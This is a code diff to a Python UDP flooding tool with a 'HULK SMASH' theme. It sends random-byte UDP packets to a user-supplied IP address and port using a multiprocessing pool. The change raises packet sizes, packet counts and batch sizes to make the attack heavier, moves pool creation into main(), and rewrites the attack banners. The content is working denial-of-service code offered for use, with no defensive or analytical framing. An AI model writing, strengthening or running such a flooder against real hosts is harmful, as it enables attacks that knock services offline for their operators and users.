@@ -2,7 +2,6 @@ import os
 import socket
 import random
 import sys
-from datetime import datetime
 from multiprocessing import Pool, cpu_count
 
 def print_banner():
@@ -48,25 +47,25 @@ def send_packet(args):
     ip, port = args
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
         try:
-            bytes = random._urandom(random.randint(100, 2000))  # Randomize packet size
+            bytes = random._urandom(random.randint(1000, 5000))  # Randomize packet size more
             sock.sendto(bytes, (ip, port))
             return True
         except Exception as e:
-            print(f" [!] HULK ANGRY! ERROR: {e} 😡")
+            print(f" [!] HULK SMASH! ERROR: {e} 😡")
             return False
 
-def send_packets(ip, port):
-    total_packets = 10000  # Total packets to send
-    batch_size = 1000  # Number of packets to send per batch
+def send_packets(ip, port, pool):
+    total_packets = 100000  # Increase total packets further
+    batch_size = 10000  # Increase batch size further
     packets_sent = 0
-    print(" [+] HULK READY! SMASHING TARGET! 💢")
+    print(" [+] HULK READY FOR ULTRA HARD MAX ATTACK! 💥")
     try:
         while packets_sent < total_packets:
             batch = min(batch_size, total_packets - packets_sent)
             args_list = [(ip, port)] * batch
             results = pool.map(send_packet, args_list)
             packets_sent += sum(results)
-            print(f" [+] Packets Sent: {packets_sent}/{total_packets} 😠")
+            print(f" [+] HULK SMASH! Packets Sent: {packets_sent}/{total_packets} 😠")
     except KeyboardInterrupt:
         print("\n [!] HULK ANGRY! INTERRUPT DETECTED... ABORTING 😡")
         print(" [-] ATTACK TERMINATED")
@@ -74,7 +73,8 @@ def send_packets(ip, port):
 def main():
     ip, port = initialize_attack()
     if validate_ip(ip):
-        send_packets(ip, port)
+        pool = Pool(processes=cpu_count())
+        send_packets(ip, port, pool)
     else:
         print(" [x] HULK ANGRY! ABORTING ATTACK. 😡")
 
@@ -83,5 +83,4 @@ def main():
     print(" [-] HULK TIRED... 😡")
 
 if __name__ == "__main__":
-    pool = Pool(processes=cpu_count())
     main()
